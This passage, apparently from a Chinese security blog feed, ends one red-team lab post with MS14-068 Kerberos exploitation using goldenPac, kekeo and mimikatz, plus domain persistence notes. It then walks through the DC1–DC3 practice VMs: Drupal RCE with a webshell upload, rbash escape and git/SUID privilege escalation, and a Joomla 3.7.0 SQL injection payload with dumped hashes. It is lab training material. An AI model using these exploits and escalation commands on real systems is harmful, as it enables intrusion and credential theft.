class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;</span><br><span class="line">OPTIONS:</span><br><span class="line">    -p &lt;clearPassword&gt;</span><br><span class="line"> --rc4 &lt;ntlmHash&gt;</span><br><span class="line"></span><br><span class="line">MS14-068.exe -u bunny@whoamianony.org -s S-1-5-21-1315137663-3706837544-1429009142-500 -d 192.168.93.30 -p Bunny2021</span><br><span class="line"># 得到TGT_moretz@whoamianony.org.ccache</span><br><span class="line"></span><br><span class="line">## 其他工具</span><br><span class="line"># goldenPac.py</span><br><span class="line">python3 goldenPac.py zjun.com/user1:P@ssw0rd@P-DC.zjun.com -dc-ip 172.16.86.136 -target-ip 172.16.86.136 -debug</span><br><span class="line"></span><br><span class="line"># goldenPac.exe</span><br><span class="line">goldenPac.exe zjun.com/user1:P@ssw0rd@P-DC.zjun.com</span><br><span class="line"></span><br><span class="line"># msf</span><br><span class="line">use auxiliary/admin/kerberos/ms14_068_kerberos_checksum</span><br><span class="line"></span><br><span class="line"># kekeo</span><br><span class="line">exploit::ms14068 /domain:zjun.com /user:user1 /password:P@ssw0rd /sid:S-1-5-21-2335421620-514153290-2844484534-1125 /ptt</span><br><span class="line"></span><br><span class="line"># mimikatz</span><br><span class="line">kerberos::golden /krbtgt: /admin:域管理 /domain:域名 /sid:sid /ticket:gold.kirbi</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230727135555788.png" alt="image-20230727135555788" /></p></li><li><p>注入票据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./mimikatz.exe </span><br><span class="line">kerberos::ptc TGT_moretz@whoamianony.org.ccache</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230727140234573.png" alt="image-20230727140234573" /></p></li><li><p>写入成功后，使用PsExec.exe等以管理员权限运行连接域控。<code>Logon Server      : DC</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe \\192.168.93.30\ c:\Windows\Temp\4803.exe</span><br></pre></td></tr></table></figure><p>这个psexec是原生的就好，impacket的用不了，以上的图可能放错了，将就看把</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230727161341392.png" alt="image-20230727161341392" /></p></li></ol><h2 id="dcomsmbwmi都是impacket就不说了"><a class="markdownIt-Anchor" href="#dcomsmbwmi都是impacket就不说了"></a> DCOM/SMB/WMI（都是impacket，就不说了）</h2><p>DCOM：DCOM 是 COM（组件对象模型）的扩展，它允许应用程序在远程计算机上实例化和访问 COM 对象的属性和方法。参考：<a href="https://www.heresecurity.wiki/heng-xiang-yi-dong/dcom-exploitation/dcom">https://www.heresecurity.wiki/heng-xiang-yi-dong/dcom-exploitation/dcom</a></p><h2 id="zerologon-cve-2020-1472"><a class="markdownIt-Anchor" href="#zerologon-cve-2020-1472"></a> ZEROLogon CVE-2020-1472</h2><p><a href="https://www.hacking8.com/tiquan/windows/NetLogon%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9ECVE-2020-1472.html">https://www.hacking8.com/tiquan/windows/NetLogon域内提权漏洞CVE-2020-1472.html</a></p><h2 id="拿到域控之后"><a class="markdownIt-Anchor" href="#拿到域控之后"></a> 拿到域控之后</h2><p>做维持：</p><ol><li>脱下ndti.dts这个数据库，然后爆破</li><li>搜集kbgts用户的ntlm哈希，存起来用来做金票据（这个跟ms14-068不一样哈，这是堂堂正正拿的！）</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基础环境设置&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#基础环境设置&quot;&gt;&lt;/a&gt; 基础环境设置&lt;/h1&gt;
&lt;p&gt;192.168.95.143&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/9eek/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DC系列靶机</title>
    <link href="https://j3f5.github.io/articles/2023/07/12/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/"/>
    <id>https://j3f5.github.io/articles/2023/07/12/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/</id>
    <published>2023-07-12T06:02:32.000Z</published>
    <updated>2023-07-12T06:02:32.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="dc1"><a class="markdownIt-Anchor" href="#dc1"></a> DC1</h1><h2 id="涉及知识点"><a class="markdownIt-Anchor" href="#涉及知识点"></a> 涉及知识点</h2><ol><li>drupal版本识别+<a href="https://blog.csdn.net/limb0/article/details/107122919">drupal RCE漏洞</a></li><li>drupal自定义密码哈希脚本查找</li><li>drupal配置文件查询</li><li>mysql增删查改</li><li>meterpreter上传下载</li><li>suid提权</li></ol><h2 id="实践"><a class="markdownIt-Anchor" href="#实践"></a> 实践</h2><p>扫描网段：发现主机10.131.210.98</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712140435902.png" alt="image-20230712140435902" /></p><p>使用nmap扫一下：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712140545277.png" alt="image-20230712140545277" /></p><p>看来可以做ssh爆破，看一下web：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712140628372.png" alt="image-20230712140628372" /></p><p>发现是apache2.2.22+drupal7+PHP5.4。扫一下目录，很多403,基本没用，那么就去看msf有什么可以利用的：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712154719821.png" alt="image-20230712154719821" /></p><p>使用较新的，而且不用登录的，即第二个，设置好之后打进去，OK，<a href="http://xn--linenum-fw3kw4fpzjcwic18n162b.sh">上传冰蝎马和linenum.sh</a>，读取到flag1：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712155004482.png" alt="image-20230712155004482" /></p><p>并且看到这个：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712154841290.png" alt="image-20230712154841290" /></p><p>直接suid提权了：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712155126132.png" alt="image-20230712155126132" /></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712155104418.png" alt="image-20230712155104418" /></p><p>之后看到/home/flag4/flag4.txt。纳闷flag3去哪了。于是看到配置文件：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712154940971.png" alt="image-20230712154940971" /></p><p>登录并且查数据：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712153950829.png" alt="image-20230712153950829" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+--------+---------------------------------------------------------+</span><br><span class="line">| name   | pass                                                    |</span><br><span class="line">+--------+---------------------------------------------------------+</span><br><span class="line">|        |                                                         |</span><br><span class="line">| admin  | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR |</span><br><span class="line">| Fred   | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |</span><br><span class="line">| admin1 | $S$DM59jnj9ztGmOy11bBQngVSuoaX6fVGsOgIXH/fLIMYYyjOjTX0Y |</span><br><span class="line">| admin2 | $S$DQDu/ko157iaafvOhwAPmbjZeMabVTLcu1bGdFbGUFfheKlB7u81 |</span><br><span class="line">+--------+---------------------------------------------------------+</span><br></pre></td></tr></table></figure><p>他们有自己的加密方式，自己更新一个密码即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./scripts/password-hash.sh 123456</span><br><span class="line"></span><br><span class="line">mysql -h localhost -u dbuser -p</span><br><span class="line">Enter password:R0ck3t</span><br><span class="line">use drupaldb;</span><br><span class="line">update users set pass=&#x27;$S$DQZsZLqxCbnNCRuvOFCQBC2snsbkjGrH3Xw4nqxxhuYIONkuC4dP&#x27; where name=&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure><p>登录看到flag3。</p><h1 id="dc2"><a class="markdownIt-Anchor" href="#dc2"></a> DC2</h1><h2 id="涉及的知识点"><a class="markdownIt-Anchor" href="#涉及的知识点"></a> 涉及的知识点</h2><ol><li>hosts添加域名解析</li><li>wpscan扫描网站+cewl生成密码+爆破密码</li><li>多端口nmap扫描</li><li>hydra爆破</li><li>绕过rbash</li><li>git提权</li></ol><h2 id="具体实践"><a class="markdownIt-Anchor" href="#具体实践"></a> 具体实践</h2><p>使用masscan扫了之后，发现进去之后，点击任何地方都会发生跳转，加上hosts就好了</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713132647970.png" alt="image-20230713132647970" /></p><p>加上后，对IP进行扫描，发现如果是普通的nmap扫描只会返回默认的服务端口，像7001，所以要扫描所有端口需要扫1-65535。</p><p>发现wordpress，使用wpscan扫一下，枚举发现用户还有一些目录</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713132413883.png" alt="image-20230713132413883" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wpscan --url http://dc-2/ --wp-content-dir wp-content -e u</span><br></pre></td></tr></table></figure><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713132330971.png" alt="image-20230713132330971" /></p><blockquote><p>这里我曾使用msf看有没有对应的漏洞，发现用不了，需要登录。所以看看怎么登录。在扫的时候，如果默认使用-e，那么不会返回tom这个结果，需要特别指定枚举</p></blockquote><p>搜索到flag1的内容，接触到cewl这个工具，生成了一个网站的dict，用它爆破（把搜集到的user放进去）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wpscan --url http://dc-2/ -U user.txt -P dict.txt </span><br></pre></td></tr></table></figure><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713141051539.png" alt="image-20230713141051539" /></p><p>在里面看到flag2，他说wordpress这个线不能用了，那就用ssh</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713133314479.png" alt="image-20230713133314479" /></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713133432449.png" alt="image-20230713133432449" /></p><p>登上去了，发现很多指令用不了，使用less查看了flag3</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713133554263.png" alt="image-20230713133554263" /></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713133934878.png" alt="image-20230713133934878" /></p><p>啥啥用不了，绝了。发现/usr/bin或者sbin里面有很多指令，使用的话会出现这个，也就是不能出现<code>/</code>，啊这？发现这个是rbash。发现rbash的绕过方法，可以使用cp来替换rbash，但是我这没有cp</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713135334984.png" alt="image-20230713135334984" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a</span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></figure><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713135753107.png" alt="image-20230713135753107" /></p><p>发现有NC，上线msf</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713140219058.png" alt="image-20230713140219058" /></p><p>没用：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713140805751.png" alt="image-20230713140805751" /></p><p>su jerry后再连接，想把meterpreter弄进来，发现不行，因为这个是32位的。</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713141433997.png" alt="image-20230713141433997" /></p><p>好吧，上面提到用git提权，一脸懵，无密码？</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713141902086.png" alt="image-20230713141902086" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、sudo git help config #在末行命令模式输入 </span><br><span class="line">!/bin/bash 或 !&#x27;sh&#x27; #完成提权 </span><br><span class="line">2、sudo git -p help </span><br><span class="line">!/bin/bash #输入!/bin/bash，即可打开一个用户为root的shell</span><br></pre></td></tr></table></figure><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713142043522.png" alt="image-20230713142043522" /></p><p>完成提权。</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713142133048.png" alt="image-20230713142133048" /></p><h1 id="dc3"><a class="markdownIt-Anchor" href="#dc3"></a> DC3</h1><p>扫描网站目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">[13:09:38] 301 -  322B  - /administrator  -&gt;  http://10.131.210.58/administrator/</span><br><span class="line">[13:09:39] 200 -    5KB - /administrator/                                   </span><br><span class="line">[13:09:39] 200 -   31B  - /administrator/cache/                             </span><br><span class="line">[13:09:39] 200 -    2KB - /administrator/includes/                          </span><br><span class="line">[13:09:39] 200 -    5KB - /administrator/index.php                          </span><br><span class="line">[13:09:39] 301 -  327B  - /administrator/logs  -&gt;  http://10.131.210.58/administrator/logs/</span><br><span class="line">[13:09:39] 200 -   31B  - /administrator/logs/                              </span><br><span class="line">[13:09:55] 301 -  312B  - /bin  -&gt;  http://10.131.210.58/bin/               </span><br><span class="line">[13:09:55] 200 -   31B  - /bin/                                             </span><br><span class="line">[13:09:59] 200 -   31B  - /cache/                                           </span><br><span class="line">[13:09:59] 301 -  314B  - /cache  -&gt;  http://10.131.210.58/cache/</span><br><span class="line">[13:10:04] 200 -   31B  - /cli/                                             </span><br><span class="line">[13:10:07] 301 -  319B  - /components  -&gt;  http://10.131.210.58/components/ </span><br><span class="line">[13:10:07] 200 -   31B  - /components/</span><br><span class="line">[13:10:09] 200 -    0B  - /configuration.php                                </span><br><span class="line">[13:10:39] 200 -    3KB - /htaccess.txt                                     </span><br><span class="line">[13:10:41] 301 -  315B  - /images  -&gt;  http://10.131.210.58/images/         </span><br><span class="line">[13:10:41] 200 -   31B  - /images/                                          </span><br><span class="line">[13:10:42] 301 -  317B  - /includes  -&gt;  http://10.131.210.58/includes/     </span><br><span class="line">[13:10:42] 200 -   31B  - /includes/                                        </span><br><span class="line">[13:10:43] 404 -    3KB - /index.php/login/                                 </span><br><span class="line">[13:10:49] 301 -  317B  - /language  -&gt;  http://10.131.210.58/language/     </span><br><span class="line">[13:10:50] 200 -   31B  - /layouts/                                         </span><br><span class="line">[13:10:51] 301 -  318B  - /libraries  -&gt;  http://10.131.210.58/libraries/   </span><br><span class="line">[13:10:51] 200 -   31B  - /libraries/                                       </span><br><span class="line">[13:10:52] 200 -   18KB - /LICENSE.txt                                      </span><br><span class="line">[13:11:00] 301 -  314B  - /media  -&gt;  http://10.131.210.58/media/           </span><br><span class="line">[13:11:00] 200 -   31B  - /media/                                           </span><br><span class="line">[13:11:04] 301 -  316B  - /modules  -&gt;  http://10.131.210.58/modules/       </span><br><span class="line">[13:11:04] 200 -   31B  - /modules/                                         </span><br><span class="line">[13:11:25] 301 -  316B  - /plugins  -&gt;  http://10.131.210.58/plugins/       </span><br><span class="line">[13:11:25] 200 -   31B  - /plugins/                                         </span><br><span class="line">[13:11:33] 200 -    4KB - /README.txt                                       </span><br><span class="line">[13:11:36] 200 -  836B  - /robots.txt.dist                                  </span><br><span class="line">[13:11:40] 403 -  301B  - /server-status                                    </span><br><span class="line">[13:11:40] 403 -  302B  - /server-status/</span><br><span class="line">[13:11:57] 301 -  318B  - /templates  -&gt;  http://10.131.210.58/templates/   </span><br><span class="line">[13:11:57] 200 -   31B  - /templates/                                       </span><br><span class="line">[13:11:57] 200 -    0B  - /templates/beez3/</span><br><span class="line">[13:11:57] 200 -    0B  - /templates/protostar/                             </span><br><span class="line">[13:11:57] 200 -    0B  - /templates/system/                                </span><br><span class="line">[13:11:57] 200 -   31B  - /templates/index.html                             </span><br><span class="line">[13:12:00] 301 -  312B  - /tmp  -&gt;  http://10.131.210.58/tmp/               </span><br><span class="line">[13:12:00] 200 -   31B  - /tmp/                                             </span><br><span class="line">[13:12:13] 200 -    2KB - /web.config.txt </span><br></pre></td></tr></table></figure><p>nmap信息扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Home</span><br><span class="line">|_http-generator: Joomla! - Open Source Content Management</span><br><span class="line">MAC Address: 00:41:0E:14:82:CB (Cloud Network Technology Singapore PTE.)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br></pre></td></tr></table></figure><p>joomla扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[+] FireWall Detector</span><br><span class="line">[++] Firewall not detected</span><br><span class="line"></span><br><span class="line">[+] Detecting Joomla Version</span><br><span class="line">[++] Joomla 3.7.0</span><br><span class="line"></span><br><span class="line">[+] Core Joomla Vulnerability</span><br><span class="line">[++] Target Joomla core is not vulnerable</span><br><span class="line"></span><br><span class="line">[+] Checking Directory Listing</span><br><span class="line">[++] directory has directory listing : </span><br><span class="line">http://10.131.210.58/administrator/components</span><br><span class="line">http://10.131.210.58/administrator/modules</span><br><span class="line">http://10.131.210.58/administrator/templates</span><br><span class="line">http://10.131.210.58/administrator/includes</span><br><span class="line">http://10.131.210.58/administrator/language</span><br><span class="line">http://10.131.210.58/administrator/templates</span><br></pre></td></tr></table></figure><h2 id="joomla-sql注入sqlmap"><a class="markdownIt-Anchor" href="#joomla-sql注入sqlmap"></a> Joomla Sql注入（SQLmap）</h2><p>有相应漏洞（Joomla 3.7.0）<a href="https://github.com/stefanlucas/Exploit-Joomla">CVE-2017-8917 SQL injection Vulnerability in Joomla! 3.7.0 exploit</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">python3 joomblah.py http://10.131.210.58  </span><br><span class="line">[-] Fetching CSRF token</span><br><span class="line"> [-] Testing SQLi</span><br><span class="line">  -  Found table: d8uea_users</span><br><span class="line">  -  Found table: users</span><br><span class="line">  -  Extracting users from d8uea_users</span><br><span class="line"> [$] Found user [&#x27;629&#x27;, &#x27;admin&#x27;, &#x27;admin&#x27;, &#x27;freddy@norealaddress.net&#x27;, &#x27;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#x27;, &#x27;&#x27;, &#x27;&#x27;]</span><br><span class="line">  -  Extracting sessions from d8uea_session</span><br><span class="line">  -  Extracting users from users</span><br><span class="line">  -  Extracting sessions from session</span><br></pre></td></tr></table></figure><p>弄到哈希，看能不能破解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span><br></pre></td></tr></table></figure><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230724142400376.png" alt="image-20230724142400376" /></p><p>获得密码snoopy（hashcat好慢）</p><p>Joomla 3.7版本后引入一个新的组件 “com_fields”，这一组件会引发易被利用的漏洞。</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230724135047334.png" alt="image-20230724135047334" /></p><p>Joomla可以根据这一路径获取视图参数和模块布局。构建URL如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?option=com_fields&amp;view=fields&amp;layout=modal</span><br></pre></td></tr></table></figure><p>view参数值：fields；layout参数值：modal。访问此URL可以显示站点上可用的所有自定义字段的列表。访问得到：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230724135350138.png" alt="image-20230724135350138" /></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230724135435934.png" alt="image-20230724135435934" /></p><p>没用，发现漏洞地址在这：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,user()),1)</span><br></pre></td></tr></table></figure><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230724135719203.png" alt="image-20230724135719203" /></p><p>OK，放到sqlmap上扫一下。（要复习一下他的操作呀，指定参数啥的）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] joomladb</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sys</span><br><span class="line"></span><br><span class="line">Database: joomladb</span><br><span class="line">[76 tables]</span><br><span class="line">+---------------------+</span><br><span class="line">| #__assets           |</span><br><span class="line">| #__associations     |</span><br><span class="line">| #__banner_clients   |</span><br><span class="line">| #__banner_tracks    |</span><br><span class="line">| #__banners          |</span><br><span class="line">| #__bsms_admin       |</span><br><span class="line">| #__bsms_books       |</span><br><span class="line">| #__bsms_comments    |</span><br><span class="line">| #__bsms_locations   |</span><br><span class="line">| #__bsms_mediafiles  |</span><br><span class="line">| #__bsms_message_typ |</span><br><span class="line">| #__bsms_podcast     |</span><br><span class="line">| #__bsms_series      |</span><br><span class="line">| #__bsms_servers     |</span><br><span class="line">| #__bsms_studies     |</span><br><span class="line">| #__bsms_studytopics |</span><br><span class="line">| #__bsms_teachers    |</span><br><span class="line">| #__bsms_templatecod |</span><br><span class="line">| #__bsms_templates   |</span><br><span class="line">| #__bsms_timeset     |</span><br><span class="line">| #__bsms_topics      |</span><br><span class="line">| #__bsms_update      |</span><br><span class="line">| #__categories       |</span><br><span class="line">| #__contact_details  |</span><br><span class="line">| #__content_frontpag |</span><br><span class="line">| #__content_rating   |</span><br><span class="line">| #__content_types    |</span><br><span class="line">| #__content          |</span><br><span class="line">| #__contentitem_tag_ |</span><br><span class="line">| #__core_log_searche |</span><br><span class="line">| #__extensions       |</span><br><span class="line">| #__fields_categorie |</span><br><span class="line">| #__fields_groups    |</span><br><span class="line">| #__fields_values    |</span><br><span class="line">| #__fields           |</span><br><span class="line">| #__finder_filters   |</span><br><span class="line">| #__finder_links_ter |</span><br><span class="line">| #__finder_links     |</span><br><span class="line">| #__finder_taxonomy_ |</span><br><span class="line">| #__finder_taxonomy  |</span><br><span class="line">| #__finder_terms_com |</span><br><span class="line">| #__finder_terms     |</span><br><span class="line">| #__finder_tokens_ag |</span><br><span class="line">| #__finder_tokens    |</span><br><span class="line">| #__finder_types     |</span><br><span class="line">| #__jbsbackup_timese |</span><br><span class="line">| #__jbspodcast_times |</span><br><span class="line">| #__languages        |</span><br><span class="line">| #__menu_types       |</span><br><span class="line">| #__menu             |</span><br><span class="line">| #__messages_cfg     |</span><br><span class="line">| #__messages         |</span><br><span class="line">| #__modules_menu     |</span><br><span class="line">| #__modules          |</span><br><span class="line">| #__newsfeeds        |</span><br><span class="line">| #__overrider        |</span><br><span class="line">| #__postinstall_mess |</span><br><span class="line">| #__redirect_links   |</span><br><span class="line">| #__schemas          |</span><br><span class="line">| #__session          |</span><br><span class="line">| #__tags             |</span><br><span class="line">| #__template_styles  |</span><br><span class="line">| #__ucm_base         |</span><br><span class="line">| #__ucm_content      |</span><br><span class="line">| #__ucm_history      |</span><br><span class="line">| 